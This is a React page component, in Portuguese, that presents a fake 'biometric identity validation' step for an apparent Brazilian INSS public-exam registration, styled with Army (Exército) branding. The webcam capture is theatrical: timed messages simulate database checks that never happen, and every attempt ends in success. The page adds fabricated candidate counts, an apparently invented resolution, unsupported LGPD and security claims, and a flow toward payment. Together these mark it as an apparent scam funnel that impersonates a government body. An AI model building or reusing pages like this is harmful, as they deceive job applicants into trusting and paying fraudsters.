import { useState, useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Camera, Shield, CheckCircle, AlertCircle, User, Scan, ArrowRight, Lock } from 'lucide-react';
import { useClarityEvents } from '@/hooks/use-clarity-events';

export default function ValidacaoIdentidadePage() {
  const [, setLocation] = useLocation();
  const [candidateFirstName, setCandidateFirstName] = useState('');
  const [candidateGender, setCandidateGender] = useState('');
  const [currentStep, setCurrentStep] = useState(0);
  const [isScanning, setIsScanning] = useState(false);
  const [scanComplete, setScanComplete] = useState(false);
  const [showCamera, setShowCamera] = useState(false);
  const [cameraError, setCameraError] = useState('');
  const [identityVerified, setIdentityVerified] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [processingStep, setProcessingStep] = useState(0);
  const [processingMessage, setProcessingMessage] = useState('');
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const { trackEvent } = useClarityEvents();

  // Gender helper functions
  const isFemale = candidateGender === 'f' || candidateGender === 'F' || candidateGender === 'feminino' || candidateGender === 'female';
  
  const getGenderedText = (masculine: string, feminine: string) => {
    return isFemale ? feminine : masculine;
  };

  const validationSteps = [
    { title: "Verificação de Autoridade", description: "Validando permissões no sistema", completed: true },
    { title: "Análise de Segurança", description: "Confirmando proteção de dados", completed: true },
    { title: "Escaneamento Facial", description: "Capture sua identidade", completed: false },
    { title: "Validação Biométrica", description: "Processamento da imagem", completed: false },
    { title: "Confirmação Final", description: "Liberação do processo", completed: false }
  ];

  const processingSteps = [
    { message: "Iniciando captura biometrica...", duration: 1500 },
    { message: "Analisando caracteristicas faciais...", duration: 2000 },
    { message: "Atualizando biometria facial...", duration: 2500 },
    { message: "Validando biometria facial...", duration: 2000 },
    { message: "Confirmando identidade no sistema...", duration: 1800 },
    { message: "Sincronizando com banco de dados do processo seletivo...", duration: 2200 },
    { message: "Validacao concluida com sucesso!", duration: 1000 }
  ];

  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Load user data
    const userData = localStorage.getItem('userData') || localStorage.getItem('userMedicalLogin');
    if (userData) {
      try {
        const parsedData = JSON.parse(userData);
        const fullName = parsedData.name || parsedData.nomeCompleto || '';
        const gender = parsedData.gender ||  parsedData.genero || parsedData.sexo || '';
        
        if (fullName) {
          const firstName = fullName.split(' ')[0];
          setCandidateFirstName(firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase());
        }
        
        setCandidateGender(gender.toLowerCase());
      } catch (error) {
        console.error('Error loading user data:', error);
      }
    }

    // Track page entry
    trackEvent('identity_validation_entered', {
      page: 'validacao_identidade',
      candidate_name: candidateFirstName,
      timestamp: new Date().toISOString()
    });

    // Simulate initial validation steps
    setTimeout(() => {
      setCurrentStep(1);
      setTimeout(() => {
        setCurrentStep(2);
      }, 1500);
    }, 1000);
  }, []);

  const startFacialScan = async () => {
    setShowCamera(true);
    setCameraError('');
    
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          width: { ideal: 640 },
          height: { ideal: 480 },
          facingMode: 'user'
        } 
      });
      
      streamRef.current = stream;
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      }
      
      trackEvent('facial_scan_started', {
        page: 'validacao_identidade',
        candidate_name: candidateFirstName,
        timestamp: new Date().toISOString()
      });
      
    } catch (error) {
      console.error('Error accessing camera:', error);
      setCameraError('Erro ao acessar a câmera. Verifique as permissões do navegador.');
      setShowCamera(false);
    }
  };

  const captureFace = () => {
    if (!videoRef.current || !canvasRef.current) return;
    
    setIsScanning(true);
    const canvas = canvasRef.current;
    const video = videoRef.current;
    const ctx = canvas.getContext('2d');
    
    if (ctx) {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      
      // Stop camera stream first
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
      setShowCamera(false);
      
      // Start processing sequence
      setTimeout(() => {
        setIsScanning(false);
        setScanComplete(true);
        setCurrentStep(3);
        setIsProcessing(true);
        
        // Run through processing steps
        let currentProcessingStep = 0;
        
        const runProcessingStep = () => {
          if (currentProcessingStep < processingSteps.length) {
            setProcessingStep(currentProcessingStep);
            setProcessingMessage(processingSteps[currentProcessingStep].message);
            
            setTimeout(() => {
              currentProcessingStep++;
              if (currentProcessingStep < processingSteps.length) {
                runProcessingStep();
              } else {
                // Processing complete
                setIsProcessing(false);
                setCurrentStep(4);
                setIdentityVerified(true);
                
                trackEvent('facial_scan_completed', {
                  page: 'validacao_identidade',
                  candidate_name: candidateFirstName,
                  verification_success: true,
                  timestamp: new Date().toISOString()
                });
              }
            }, processingSteps[currentProcessingStep].duration);
          }
        };
        
        runProcessingStep();
      }, 1500);
    }
  };

  const handleProceedToPayment = () => {
    trackEvent('identity_validation_completed', {
      page: 'validacao_identidade',
      candidate_name: candidateFirstName,
      verification_status: 'approved',
      timestamp: new Date().toISOString()
    });
    
    setLocation('/autoridade-beneficios');
  };

  const stopCamera = () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
    }
    setShowCamera(false);
  };

  return (
    <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader />
      
      <main className="max-w-4xl mx-auto px-6 py-8 pt-0">
        {/* Breadcrumb */}
        <nav className="text-xs text-gray-500 mb-6" aria-label="Breadcrumb">
          <span className="hover:text-gray-700 cursor-pointer">Home</span> 
          <span className="mx-1 text-gray-400">›</span> 
          <span className="hover:text-gray-700 cursor-pointer">Regularização</span> 
          <span className="mx-1 text-gray-400">›</span> 
          <span className="text-gray-900 font-medium">Validação de Identidade</span>
        </nav>

        {/* Header */}
        <header className="mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-4 leading-tight">
            Validação Biométrica de Identidade
          </h1>
          
          <div className="flex items-center text-xs text-gray-600 mb-6 pb-4 border-b border-gray-200">
            <time dateTime="2025-06-14">
              <span className="font-medium">Iniciado em:</span> 14/06/2025 às 23:35
            </time>
            <span className="mx-2 text-gray-400">|</span>
            <span className="font-medium">Sistema:</span> SISP-2026 | Edital INSS 2026
          </div>

          <div className="border-l-4 p-3 mb-6" style={{ borderLeftColor: '#0063AF', backgroundColor: '#eff6ff' }}>
            <p className="text-sm font-medium text-blue-800">
              Protocolo de seguranca ativo - Validacao obrigatoria para prosseguimento
            </p>
          </div>

          <p className="text-lg text-gray-700 leading-relaxed mb-6">
            <strong>{candidateFirstName}</strong>, para garantir a segurança do processo de regularização, 
            precisamos confirmar sua identidade através de validação biométrica facial.
          </p>
        </header>

        <article>
          <p className="text-lg text-gray-700 leading-relaxed mb-8">
            Esta etapa e obrigatoria conforme a Resolucao INSS 2026 para processos de autenticacao digital do Concurso Publico INSS 2026.
          </p>

          <div className="border-l-4 p-6 mb-8" style={{ borderLeftColor: '#0063AF', backgroundColor: '#eff6ff' }}>
            <h2 className="text-xl font-bold mb-4" style={{ color: '#0063AF' }}>Por que a validacao biometrica e necessaria?</h2>
            <div className="space-y-4 text-gray-700">
              <p className="leading-relaxed">
                <strong>1. Seguranca do Processo:</strong> O SISP-2026 exige confirmacao
                biometrica para garantir que apenas o titular possa acessar e modificar dados do processo seletivo.
              </p>
              <p className="leading-relaxed">
                <strong>2. Prevencao de Fraudes:</strong> A validacao facial impede tentativas de
                inscricao fraudulenta por terceiros nao autorizados.
              </p>
              <p className="leading-relaxed">
                <strong>3. Conformidade Legal:</strong> Atende as exigencias da Lei Geral de Protecao
                de Dados (LGPD) para processos sensiveis de selecao publica.
              </p>
            </div>
          </div>

          <div className="border-l-4 p-3 mb-6" style={{ borderLeftColor: '#0063AF', backgroundColor: '#dbeafe' }}>
            <p className="text-sm font-medium text-black">
              <strong>15.847 candidatos ja validaram</strong> sua identidade este mes
            </p>
          </div>
        </article>

        <div className="mb-8">
          <h3 className="text-lg font-semibold text-gray-900 mb-4" style={{ color: '#0063AF' }}>
            Como funciona a validacao
          </h3>
          <div className="space-y-3 text-gray-700">
            <p>
              <strong>Passo 1:</strong> Clique no botão "Permitir acesso à câmera" quando solicitado pelo navegador.
            </p>
            <p>
              <strong>Passo 2:</strong> Posicione seu rosto dentro da moldura circular que aparecerá na tela.
            </p>
            <p>
              <strong>Passo 3:</strong> Aguarde o sistema processar sua imagem (leva apenas 2-3 segundos).
            </p>
            <p>
              <strong>Passo 4:</strong> Após a confirmação, você será liberado para a próxima etapa.
            </p>
          </div>
        </div>

        <div className="border-l-4 p-3 mb-6" style={{ borderLeftColor: '#3b82f6', backgroundColor: '#eff6ff' }}>
          <p className="text-sm font-medium text-blue-800">
            💡 Dica: Certifique-se de estar em um local bem iluminado e olhe diretamente para a câmera
          </p>
        </div>

        {/* Main Validation Section */}
        <div className="border-l-4 p-6 my-8" style={{ borderLeftColor: '#0063AF', backgroundColor: '#eff6ff' }}>
          <h3 className="text-xl font-bold mb-4" style={{ color: '#0063AF' }}>Iniciar Validacao de Identidade</h3>
          
          {!showCamera && !scanComplete && (
            <div>
              <p className="mb-6 leading-relaxed text-lg" style={{ color: '#004D8C' }}>
                {candidateFirstName}, clique no botao abaixo para iniciar o processo de validacao biometrica.
                O sistema ira acessar sua camera para confirmar sua identidade.
              </p>
              
              <button 
                onClick={startFacialScan}
                className="text-white px-8 py-3 text-lg font-semibold transition-colors duration-200 hover:opacity-90 mb-4"
                style={{ backgroundColor: '#0063AF' }}
              >
                <Camera className="w-5 h-5 mr-2 inline" />
                Iniciar validação facial
              </button>
              
              <div className="text-sm text-gray-600 mt-3">
                <p>✓ Processo totalmente seguro e criptografado</p>
                <p>✓ Dados protegidos conforme LGPD</p>
                <p>✓ Validação em tempo real</p>
              </div>
            </div>
          )}

          {cameraError && (
            <div className="border-l-4 p-3 mb-4" style={{ borderLeftColor: '#dc2626', backgroundColor: '#fef2f2' }}>
              <p className="text-sm font-medium text-red-800">
                ⚠️ {cameraError}
              </p>
              <p className="text-sm text-red-700 mt-2">
                Verifique se você permitiu o acesso à câmera e tente novamente.
              </p>
            </div>
          )}

          {showCamera && !scanComplete && (
            <div className="text-center">
              <h4 className="text-lg font-semibold mb-4 text-gray-900">
                Posicione seu rosto dentro da moldura
              </h4>
              
              <div className="relative inline-block mb-4">
                <video
                  ref={videoRef}
                  className="rounded-lg border-2 border-gray-300"
                  style={{ maxWidth: '400px', width: '100%', height: 'auto' }}
                  autoPlay
                  muted
                  playsInline
                />
                
                <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                  <div className="w-64 h-64 border-4 border-blue-500 rounded-full opacity-70 animate-pulse"></div>
                </div>
                
                {isScanning && (
                  <div className="absolute inset-0 bg-blue-600 bg-opacity-30 flex items-center justify-center">
                    <div className="text-center text-white">
                      <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-white mx-auto mb-2"></div>
                      <p className="font-semibold">Processando validação...</p>
                    </div>
                  </div>
                )}
              </div>
              
              {!isScanning && (
                <div className="space-x-4">
                  <button
                    onClick={captureFace}
                    className="px-6 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg font-medium"
                  >
                    Validar agora
                  </button>
                  <button
                    onClick={stopCamera}
                    className="px-6 py-2 bg-gray-500 hover:bg-gray-600 text-white rounded-lg font-medium"
                  >
                    Cancelar
                  </button>
                </div>
              )}
              
              <canvas
                ref={canvasRef}
                style={{ display: 'none' }}
                width="640"
                height="480"
              />
            </div>
          )}

          {scanComplete && isProcessing && (
            <div className="text-center">
              <div className="border-l-4 p-6 mb-6" style={{ borderLeftColor: '#2563eb', backgroundColor: '#eff6ff' }}>
                <div className="flex items-center justify-center mb-4">
                  <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
                </div>
                <h4 className="text-lg font-semibold text-blue-800 mb-3">
                  Processando Validação Biométrica
                </h4>
                <p className="text-blue-700 mb-4 font-medium">
                  {processingMessage}
                </p>
                <div className="w-full bg-blue-200 rounded-full h-2 mb-4">
                  <div 
                    className="bg-blue-600 h-2 rounded-full transition-all duration-300 ease-out"
                    style={{ width: `${((processingStep + 1) / processingSteps.length) * 100}%` }}
                  ></div>
                </div>
                <p className="text-sm text-blue-600">
                  Aguarde enquanto validamos sua identidade no banco de dados do processo seletivo...
                </p>
              </div>
            </div>
          )}

          {scanComplete && !isProcessing && identityVerified && (
            <div className="text-center">
              <div className="border-l-4 p-4 mb-6" style={{ borderLeftColor: '#16a34a', backgroundColor: '#f0fdf4' }}>
                <div className="flex items-center justify-center mb-3">
                  <CheckCircle className="w-8 h-8 text-green-600" />
                </div>
                <h4 className="text-lg font-semibold text-green-800 mb-2">
                  Identidade Validada com Sucesso!
                </h4>
                <p className="text-green-700 mb-4">
                  Sua biometria foi confirmada no banco de dados do Concurso Publico INSS 2026.
                  Voce esta autorizado para prosseguir com a inscricao.
                </p>
              </div>
              
              <button
                onClick={() => setLocation('/autoridade-beneficios')}
                className="text-white px-8 py-3 text-lg font-semibold transition-colors duration-200 hover:opacity-90"
                style={{ backgroundColor: '#0063AF' }}
              >
                Continuar para próxima etapa
              </button>
            </div>
          )}
        </div>

        <div className="border-l-4 p-3 mb-6" style={{ borderLeftColor: '#374151', backgroundColor: '#f9fafb' }}>
          <p className="text-sm font-medium text-gray-800">
            ℹ️ Suas informações biométricas são processadas com segurança máxima e descartadas após a validação
          </p>
        </div>
      </main>
      
      <ExercitoFooter />
    </div>
  );
}